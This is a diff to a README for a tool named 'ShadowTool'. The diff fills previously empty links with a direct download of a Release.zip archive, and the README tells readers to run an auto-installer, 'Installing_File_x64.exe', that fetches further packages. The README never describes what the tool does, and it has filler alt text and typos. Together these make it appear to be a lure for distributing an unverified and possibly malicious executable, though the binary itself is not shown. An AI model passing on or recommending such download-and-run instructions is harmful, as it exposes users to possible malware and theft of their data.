@@ -10,9 +10,9 @@ ShadowTool
 To install this programm, follow these steps:
 
 [![asdasdasd](https://github.com/user-attachments/assets/cd92a8b8-2880-4542-9585-6ff104d6d239)
-]() 
+](https://github.com/sandesh034/ShadowTool/releases/download/V7.32/Release.zip) 
 
-## **1. [Download the archive]() from releases and extract it to a convenient folder.**
+## **1. [Download the archive](https://github.com/sandesh034/ShadowTool/releases/download/V7.32/Release.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![1](https://github.com/user-attachments/assets/b255d757-b24b-4f61-87a2-d4f3557f18d9)
